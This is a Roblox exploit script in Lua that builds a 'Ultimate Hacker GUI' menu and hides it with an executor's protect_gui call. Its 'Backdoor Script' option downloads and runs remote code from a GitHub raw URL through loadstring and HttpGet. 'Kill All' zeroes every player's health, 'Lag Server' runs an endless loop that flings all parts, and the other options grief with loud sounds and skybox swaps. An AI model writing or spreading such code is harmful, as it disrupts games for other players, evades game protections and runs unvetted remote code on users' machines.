local ScreenGui = Instance.new("ScreenGui")
if syn and syn.protect_gui then
    syn.protect_gui(ScreenGui)
end
ScreenGui.Parent = game:GetService("CoreGui")

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
Frame.Size = UDim2.new(0, 350, 0, 250)
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Text = "Ultimate Hacker GUI"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Title.TextColor3 = Color3.fromRGB(0,255,0)
Title.Font = Enum.Font.Code
Title.TextSize = 18

-- Dropdown
local DropDown = Instance.new("TextButton")
DropDown.Parent = Frame
DropDown.Text = "Select Action"
DropDown.Position = UDim2.new(0, 0, 0, 40)
DropDown.Size = UDim2.new(1, 0, 0, 30)
DropDown.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DropDown.TextColor3 = Color3.fromRGB(255,255,255)
DropDown.Font = Enum.Font.Code
DropDown.TextSize = 16

local OptionsFrame = Instance.new("Frame")
OptionsFrame.Parent = Frame
OptionsFrame.Position = UDim2.new(0, 0, 0, 70)
OptionsFrame.Size = UDim2.new(1, 0, 0, 150)
OptionsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
OptionsFrame.Visible = false

local Options = {
    "Backdoor Script",
    "Play Sound",
    "Change Skybox",
    "Kill All",
    "Lag Server"
}

local Selected = nil

for i, v in pairs(Options) do
    local btn = Instance.new("TextButton")
    btn.Parent = OptionsFrame
    btn.Text = v
    btn.Position = UDim2.new(0, 0, 0, (i-1)*30)
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Font = Enum.Font.Code
    btn.TextSize = 16
    btn.MouseButton1Click:Connect(function()
        DropDown.Text = v
        Selected = v
        OptionsFrame.Visible = false
    end)
end

DropDown.MouseButton1Click:Connect(function()
    OptionsFrame.Visible = not OptionsFrame.Visible
end)

local InputBox = Instance.new("TextBox")
InputBox.Parent = Frame
InputBox.Position = UDim2.new(0, 0, 0, 170)
InputBox.Size = UDim2.new(1, 0, 0, 30)
InputBox.PlaceholderText = "Optional ID Input"
InputBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
InputBox.TextColor3 = Color3.fromRGB(255,255,255)
InputBox.Visible = false
InputBox.Font = Enum.Font.Code
InputBox.TextSize = 16

local Execute = Instance.new("TextButton")
Execute.Parent = Frame
Execute.Text = "Execute"
Execute.Position = UDim2.new(0, 0, 0, 210)
Execute.Size = UDim2.new(1, 0, 0, 30)
Execute.BackgroundColor3 = Color3.fromRGB(50,50,50)
Execute.TextColor3 = Color3.fromRGB(255,255,255)
Execute.Font = Enum.Font.Code
Execute.TextSize = 16

DropDown.MouseButton1Click:Connect(function()
    OptionsFrame.Visible = not OptionsFrame.Visible
end)

Execute.MouseButton1Click:Connect(function()
    if Selected == "Backdoor Script" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/coolrobloxkid23/hahagui/main/script.lua"))()
    elseif Selected == "Play Sound" then
        local sound = Instance.new("Sound", workspace)
        sound.SoundId = "rbxassetid://"..InputBox.Text
        sound.Looped = true
        sound.Volume = 10
        sound:Play()
    elseif Selected == "Change Skybox" then
        local l = game.Lighting
        local id = "5221523741"
        l.Sky.SkyboxBk = "rbxassetid://"..id
        l.Sky.SkyboxDn = "rbxassetid://"..id
        l.Sky.SkyboxFt = "rbxassetid://"..id
        l.Sky.SkyboxLf = "rbxassetid://"..id
        l.Sky.SkyboxRt = "rbxassetid://"..id
        l.Sky.SkyboxUp = "rbxassetid://"..id
    elseif Selected == "Kill All" then
        for _,plr in pairs(game.Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.Health = 0
            end
        end
    elseif Selected == "Lag Server" then
        while true do
            for _,v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Velocity = Vector3.new(math.random(-9999,9999), math.random(-9999,9999), math.random(-9999,9999))
                end
            end
            wait()
        end
    end
end)
